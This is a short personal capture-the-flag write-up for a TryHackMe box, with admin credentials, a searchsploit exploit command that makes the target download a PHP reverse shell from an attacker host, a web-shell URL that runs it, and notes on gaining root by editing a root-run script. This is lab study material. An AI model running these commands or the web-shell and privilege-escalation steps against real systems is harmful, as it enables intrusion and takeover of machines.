found creds through port 1337
```
admin
OllieUnixMontgomery!

searchsploit -m php/webapps/50963.py

python3 50963.py -url <http://10.10.234.38/> -usr admin -pwd 'OllieUnixMontgomery!' -cmd 'wget <http://10.108/rev4.php> -O /tmp/rev6.php'

<http://10.10.234.38/evil.php?cmd=php%20-f%20/tmp/rev6.php>
```
shell :)

---

PRIVESC

```
su ollie 
OllieUnixMontgomery!

Ran pspy64 and saw this process ran by UID (root)

And as you can see the members in the group of ollie (us) can read and write into this file owned by root, however we can not execute it. We have to wait till root triggers this binary again. 

However this process is not part of a cronjob, so we needed pspy to be able to see this.

I wrote this in the file instead:

Now just waiting for root to use this process 

I forgot the “#!/bin/bash” part of the script, and that seems to have prevented me to give /bin/bash suid binary at first, however it is now fixed

As you can see this process got ran by UID 0 (root) again and this time executed the script we modified with olly

And we are root!
```

![unnamed_addfdfcda71240e291bd2fbba75f26ec](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/ollie/{{notename}}-202605011506.png)
![unnamed_d92cdfceb8fd43f69f0fdab496cf8832](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/ollie/{{notename}}-202605011506-1.png)
![unnamed_cf5a90984b8f4181968bd9e34fdc27ea](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/ollie/{{notename}}-202605011506-2.png)
![unnamed_1745b83cbb3541f2971d2f99efb8cf4b](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/ollie/{{notename}}-202605011507.png)
![unnamed_d8471aaf8cef4a34b8904e57c46efbb5](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/ollie/{{notename}}-202605011507-1.png)